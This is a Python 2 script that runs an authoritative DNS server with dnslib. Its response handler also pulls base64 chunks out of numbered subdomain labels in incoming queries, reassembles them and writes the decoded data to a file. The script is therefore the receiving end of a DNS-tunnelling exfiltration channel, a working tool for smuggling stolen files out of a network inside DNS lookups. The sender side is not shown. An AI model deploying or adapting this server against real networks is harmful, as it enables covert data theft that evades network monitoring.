#!/usr/bin/python
import sys
import threading
import SocketServer
from dnslib import *
import time

class DomainN(str):
  def __getattr__(self, item):
    return DomainN(item + '.' + self)
dn = DomainN('<Your Domain Name>')
ip = '<IP You want to show up in A Record>'
TTL = 60 * 5
port = 53
soa_record = SOA(
                  mname=dn.ns1,
                  rname=dn.me,
                  times=(
                          201307231,
                          60 * 60 * 1,
                          60 * 60 * 3,
                          60 * 60 * 24,
                          60 * 60 * 1,
                          )
                  )
ns_records = [NS(dn.ns1)]
records = {
            dn: [A(ip), MX(dn.mail), soa_record] + ns_records,
            dn.ns1: [A(ip)],
            dn.mail: [A(ip)],
            dn.me: [CNAME(dn)],
            }
fullfile = []
def response(data):
  request = DNSRecord.parse(data)
  print "Request: ", request
  reply = DNSRecord(DNSHeader(id=request.header.id, qr=1,aa=1, ra=1), q=request.q)
  qname = request.q.qname
  qn = str(qname)
  qn = qn[:-1]
  print "Qname: ", qn
  print dn
  qtype = request.q.qtype
  print qtype
  qt = QTYPE[qtype]
  print qt
  check = qn.split('.')
  print check
  if check[0].isdigit():
    filepart = check[1].rstrip()
    filepart += '=' *(-len(filepart) % 4)
#    pad_file = add_pad(filepart)
    #build_data(str(filepart))
    fullfile.append(str(filepart))
  print "Continue with legit request"
  if qn == dn or qn.endswith('.' + dn): 
    for name, rrs in records.iteritems():
      print "Name: ", name
      print "rrs: ", rrs
      if name in qn:
        for rdata in rrs:
          rqt = rdata.__class__.__name__
          print "rqt: ", rqt
          if qt in ['*', rqt]:
            reply.add_answer(RR(rname=qname, rtype=qtype, rclass=1, ttl=TTL, rdata=rdata))
    for rdata in ns_records:
      reply.add_ar(RR(rname=dn, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))
    reply.add_ar(RR(rname=dn, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))
  print "==== Reply:\n", reply
  #if len(fullfile) > 0:
  build_data(fullfile)
  return reply.pack()

#def add_pad(b64file):

def build_data(listf):
  with open('out.b64', 'w+') as f:
    print listf
    for i in listf:
      f.write(i.decode('base64'))
  
class RQHandler(SocketServer.BaseRequestHandler):

  def get_data(self):
    raise NotImplementedError
  def send_data(self, data):
    raise NotImplementedError
  def handle(self):
    print "\n\n %s request (%s %s):" %(self.__class__.__name__[:3], self.client_address[0], self.client_address[1])
    try:
      data = self.get_data()
      self.send_data(response(data))
    except Exception as e:
      print e
class UDPRQH(RQHandler):
  def get_data(self):
    return self.request[0]
  def send_data(self, data):
   # print data
    return self.request[1].sendto(data, self.client_address)

if __name__ == '__main__':
  print "Server starting..."
  server = [ SocketServer.ThreadingUDPServer(('', port), UDPRQH)] 
  for s in server:
    thread = threading.Thread(target=s.serve_forever)
    thread.daemon = True
    thread.start()
    print "Server is ready to recieve"
    try:
      while 1:
        time.sleep(1)
        sys.stderr.flush()
        sys.stdout.flush()
    except KeyboardInterrupt:
      pass
    finally:
      for s in server:
        s.shutdown()
